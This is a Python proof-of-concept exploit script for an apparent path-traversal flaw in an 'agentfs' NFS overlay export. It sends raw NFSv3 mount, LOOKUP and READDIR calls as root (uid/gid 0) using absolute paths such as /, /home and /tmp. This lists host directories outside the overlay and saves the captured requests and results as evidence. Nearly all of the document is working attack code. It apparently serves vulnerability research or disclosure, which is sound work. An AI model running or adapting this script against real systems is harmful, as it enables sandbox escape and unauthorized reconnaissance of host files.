#!/usr/bin/env python3
"""NFSv3 enumeration PoC: absolute LOOKUP + READDIR of host dirs.

Prereqs: an `agentfs serve nfs` overlay export reachable at --host/--port.
Example:
  python3 nfs_enum.py --outdir out/enum --host 127.0.0.1 --port 11111 \
      --paths / /home /tmp
"""
import argparse
import datetime
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import nfs_traversal_capture as n


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=11111)
    ap.add_argument("--uid", type=int, default=0)
    ap.add_argument("--gid", type=int, default=0)
    ap.add_argument("--paths", nargs="+",
                    default=["/", "/home", "/tmp"],
                    help="absolute paths to LOOKUP+READDIR")
    args = ap.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    idx = [0]

    def rpc(prog, proc, body):
        r, req, resp = n.rpc(args.host, args.port, prog, 3, proc, body,
                             args.uid, args.gid)
        idx[0] += 1
        n.save(outdir, idx[0], f"{proc:02d}", req, resp)
        return r, req, resp

    def mnt():
        r, _, _ = rpc(100005, 1, n.X().s("/"))
        st = r.u32()
        fh = r.op()
        assert st == 0, st
        return fh

    def lookup(root, name):
        r, _, _ = rpc(100003, 3, n.X().op(root).s(name))
        st = r.u32()
        if st != 0:
            return st, None, None
        fh = r.op()
        obj = r.attrs()
        r.attrs()
        return st, fh, obj

    def readdir_parse(r):
        r.attrs()
        r.o += 8  # cookieverf (dirversion)
        entries = []
        while True:
            follows = r.u32()
            if not follows:
                break
            fid = r.u64()
            name = r.op().decode("utf-8", "replace")
            cookie = r.u64()
            entries.append((name, fid, cookie))
        eof = r.u32()
        return entries, bool(eof)

    res = {"started_utc": datetime.datetime.now(datetime.timezone.utc)
           .isoformat().replace("+00:00", "Z"),
           "host": args.host, "port": args.port,
           "uid": args.uid, "gid": args.gid, "listings": []}
    root = mnt()
    print("[+] MNT", root.hex())
    for path in args.paths:
        st, fh, obj = lookup(root, path)
        print(f"[+] LOOKUP {path!r} status={st}"
              + (f" mode={oct(obj['mode'])}" if obj else ""))
        if st != 0 or fh is None:
            continue
        x = n.X().op(fh).u64(0)
        x.b += b"\x00" * 8
        x.u32(1 << 20).u32(1 << 20)
        r, _, _ = rpc(100003, 16, x)
        st = r.u32()
        if st != 0:
            print("    READDIR status", st)
            continue
        entries, eof = readdir_parse(r)
        names = [e[0] for e in entries]
        print(f"    READDIR {len(names)} entries eof={eof}: {names[:40]}")
        res["listings"].append(
            {"path": path, "status": st, "eof": eof,
             "entries": [{"name": e[0], "fileid": e[1]} for e in entries]})
    res["finished_utc"] = datetime.datetime.now(datetime.timezone.utc) \
        .isoformat().replace("+00:00", "Z")
    (outdir / "result.json").write_text(json.dumps(res, indent=2) + "\n")
    print("[+] evidence ->", outdir)


if __name__ == "__main__":
    main()
